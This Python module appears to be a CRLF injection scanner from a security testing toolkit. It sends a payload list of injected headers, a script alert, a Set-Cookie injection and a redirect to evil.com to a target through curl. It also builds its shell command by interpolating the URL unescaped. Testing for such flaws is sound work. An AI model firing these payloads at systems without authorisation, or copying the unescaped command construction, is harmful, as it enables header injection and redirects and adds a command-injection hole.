"""CRLF injection scanner."""
from __future__ import annotations
from typing import Any
from utils import run_cmd

CRLF_PAYLOADS: list[str] = [
    "%0d%0aX-Injected: true",
    "%0aX-Injected: true",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nX-Injected: true",
    "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF
    "%0d%0aSet-Cookie: crlf=injected",
    "%0d%0aLocation: https://evil.com",
]

def scan_crlf(target: str) -> dict[str, Any]:
    """Test for CRLF injection in URL path and parameters."""
    url = target if target.startswith("http") else f"https://{target}"
    findings = []
    for payload in CRLF_PAYLOADS:
        # Test in URL path
        test_url = f"{url}/{payload}"
        try:
            result = run_cmd(f"curl -s -I '{test_url}' --max-time 5")
            if "X-Injected: true" in result or "crlf=injected" in result:
                findings.append(f"CRLF in path: {payload[:30]} - injected header confirmed")
        except Exception:
            pass
        # Test in query parameter
        sep = "&" if "?" in url else "?"
        test_url2 = f"{url}{sep}q={payload}"
        try:
            result = run_cmd(f"curl -s -I '{test_url2}' --max-time 5")
            if "X-Injected: true" in result or "crlf=injected" in result:
                findings.append(f"CRLF in param: {payload[:30]} - injected header confirmed")
        except Exception:
            pass
    output = "\n".join(findings) if findings else "No CRLF injection found"
    return {"stdout": output, "returncode": 0 if findings else 1}
